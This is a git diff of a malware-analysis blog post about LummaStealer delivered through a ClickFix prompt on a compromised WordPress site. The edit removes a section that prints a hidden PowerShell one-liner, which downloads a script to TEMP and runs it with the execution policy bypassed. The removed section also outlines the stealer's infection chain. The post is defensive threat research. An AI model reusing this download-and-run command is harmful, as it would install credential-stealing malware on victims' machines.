@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "LummaStealer - ClickFix Payload"
+title:  "LummaStealer Infected Website - ClickFix Payload"
 date:   2025-06-16 21:00:00 +1000
 categories: malware analysis
 ---
@@ -15,9 +15,9 @@ categories: malware analysis
 
 ## Overview - LummaStealer Malware Analysis (27th July 2025)
 
-Full malware analysis on LummaStealer on a compromised website. This one took me some time as the malware is super impressive.
+Full malware analysis on how LummaStealer is delivered on a compromised website. 
 
-LummaStealer has lots of different variants. Therefore, malware analysis found online varies significantly. A compromised website I've been monitoring that has pushed three different samples of LummaStealer to it's victims in the past week. Furthermore, each time you query the stage one domain the network IOCs change. So, it's super neat. One cool pickup that does seem consistent is. If your host in running in Russian, the malware terminates. Make of that what you like.
+LummaStealer has lots of different variants. Therefore, malware analysis found online varies significantly. A compromised website I've been monitoring that has pushed three different samples of LummaStealer to it's victims in the past week. Furthermore, each time you query the stage one domain the network IOCs rotate. So, it's super neat. One cool pickup that does seem consistent is. If your host in running in Russian, the malware terminates. Make of that what you like.
 
 ### ClickFix Prompt Compromised Website
 
@@ -108,28 +108,15 @@ Plot twist! You have got to be joking. So essentially what this means is. LummaS
 When I go to paste the command in run I get the domain 'veriqloudx' not 'fullporner'. Anyway, veriq was created two days ago. Pretty neat, good rep on VT. Nice.
 ![VT Veriqloudx](/images/veriq_rep.PNG)
 
-### Lets run the payload
+### So how was the website compromised?
 
-Alright now we know what the server side is getting up to. Lets run one of these payloads in a VM and dig into what it's doing.
+After running some basic recon scans on my own environment that replicated the website but slightly different here's what I can see:
+- Hosted on Fastly
+- Sitting behind FlyWheel WAF
+- Using WordPress version 6.8.1 (Released - April 30, 2025)
+- WordPress Theme 'Gaspard'
+- Managed by FlyWheel
+- Using Yoast SEO 25.5 Premium WP Plugin
+- Every request to any directory returns a 301 to Clickfix
 
-I'm going to go with:
-- ```powershell -w h -c "$f=$env:TEMP+'\\'+[guid]::NewGuid()+'.ps1';curl ${gotourl} -o $f;powershell -w h -ep Bypass -f $f```
-
-LummaStealer as per previous writeups does VM/Sandboxing detection capabilities. So this may be difficult.
-
-Anyway, here is my setup for running this.
-- Windows 10 VM (Snapshotted before malware detonation)
-- WireShark
-- Procmon
-- Process Explorer
-- API Monitor
-- Pe Bear
-
-The Lumma infection chain tends to work like this.
-1. Downloads payload
-2. Pulls C compiler and creates malicious .cmdline files
-3. Runs these files in memory
-4. Creates persistence
-5. Scans browsers and other locations for passwords and host information
-6. Exfilitrates initial data
-7. Downloads and executes beacon
+Nothing sticks out that is blatantly obvious
